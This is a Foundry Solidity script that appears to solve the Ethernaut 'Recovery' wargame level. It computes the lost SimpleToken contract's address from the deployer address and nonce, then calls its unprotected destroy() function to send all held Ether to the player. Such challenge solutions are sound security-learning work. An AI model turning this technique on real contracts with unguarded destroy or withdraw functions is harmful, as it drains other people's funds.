// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SimpleToken} from "../src/Recovery.sol";
import "forge-std/Script.sol";

// Script to compute the address of the SimpleToken contract and recover any Ether stored there
contract ContractAddressRecovery is Script {

    function run() external {
        // The creator's address (replace with the actual contract deployer address)
        address deployerAddress = 0xYourInstanceAddressHere;

        // Nonce used for contract creation (1 for the first contract created by this address)
        uint256 nonce = 1; 

        // Player's address to receive recovered funds (replace with your player address)
        address payable playerAddress = payable(0xYourPlayerAddressHere);

        // Compute the address of the contract based on the deployer and nonce
        address newContractAddress = computeContractAddress(deployerAddress, nonce);

        //Instantiate the SimpleToken contract at the computed address
        SimpleToken recoveryInstance = SimpleToken(payable(newContractAddress));

        //Destroy the contract and send all Ether to the player address
        recoveryInstance.destroy(playerAddress);

    }

    // Function to compute the contract address from the deployer's address and the nonce
    function computeContractAddress(address deployer, uint256 nonce) internal pure returns (address) {
        bytes memory rlpEncoded;
        
        // RLP encode the deployer's address and nonce based on the nonce size
        if (nonce == 0x00) {
            rlpEncoded = abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80));
        } else if (nonce <= 0x7f) {
            rlpEncoded = abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(uint8(nonce)));
        } else if (nonce <= 0xff) {
            rlpEncoded = abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(uint8(nonce)));
        } else if (nonce <= 0xffff) {
            rlpEncoded = abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes2(uint16(nonce)));
        } else if (nonce <= 0xffffff) {
            rlpEncoded = abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes3(uint24(nonce)));
        } else {
            rlpEncoded = abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes4(uint32(nonce)));
        }

        // Compute the Keccak256 hash of the RLP-encoded data
        bytes32 hash = keccak256(rlpEncoded);

        // Return the last 20 bytes of the hash, which gives the contract's address
        return address(uint160(uint256(hash)));
    }
}